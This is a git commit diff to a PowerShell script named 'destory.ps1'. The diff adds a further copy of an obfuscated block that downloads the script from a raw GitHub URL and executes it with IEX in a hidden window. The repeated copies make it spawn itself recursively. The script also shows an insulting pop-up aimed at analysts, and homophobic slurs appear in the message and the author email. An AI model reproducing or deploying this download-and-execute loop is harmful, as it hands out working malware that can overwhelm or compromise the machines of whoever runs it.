922a667003c53262f03cc8ce5b5ba345d3881252
43a1723 <hai1723notgay@gmail.com>
2025-04-10 13:05:37 +0700

    Update destory.ps1

--- s/destory.ps1
+++ s/destory.ps1
@@ -1,9 +1,11 @@
-
+$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/destory.ps1")
+$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
 $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/destory.ps1")
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
 [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") | Out-Null
-[System.Windows.Forms.MessageBox]::Show("Analysis is gay!", "💀 Fuck 💀", "OK", "Warning")
+[System.Windows.Forms.MessageBox]::Show("Analysis is gay!", " Fuck ", "OK", "Warning")
 $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/destory.ps1")
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
